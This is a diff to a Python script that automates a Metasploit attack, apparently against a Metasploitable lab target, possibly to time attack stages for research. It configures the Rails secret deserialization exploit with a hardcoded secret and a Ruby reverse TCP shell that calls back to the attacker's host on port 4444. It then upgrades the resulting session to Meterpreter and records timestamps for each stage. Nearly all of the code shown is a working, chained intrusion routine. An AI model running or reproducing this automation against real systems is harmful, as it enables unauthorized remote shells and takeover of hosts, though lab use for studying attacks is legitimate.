@@ -23,17 +23,31 @@ def main(argv):
     exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
     payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
 
-    exploit['COOKIE_NAME'] = "_metasploitable"
     exploit['RHOSTS'] = target_ip
     exploit['RPORT'] = 8181
-    payload['SECRET'] = "a7aebc287bba0ee4e64f947415a94e5f"
+    exploit['TARGETURI'] = '/'
+    exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
+    payload['LHOST'] = my_ip
+    payload['LPORT'] = 4444
 
     output_time_file = 'time_stage_1_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
-    #print('Start 1')
+    # print('Start 1')
 
     exploit.execute(payload=payload)
+
+    while client.jobs.list:
+        time.sleep(1)
+
+    # print(client.sessions.list['1'])
+
+    exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
+    exploit['SESSION'] = 1
+    exploit.execute()
+
+    while client.jobs.list:
+        time.sleep(1)
 
     time.sleep(10)
     output_time_file = 'time_stage_1_end.txt'
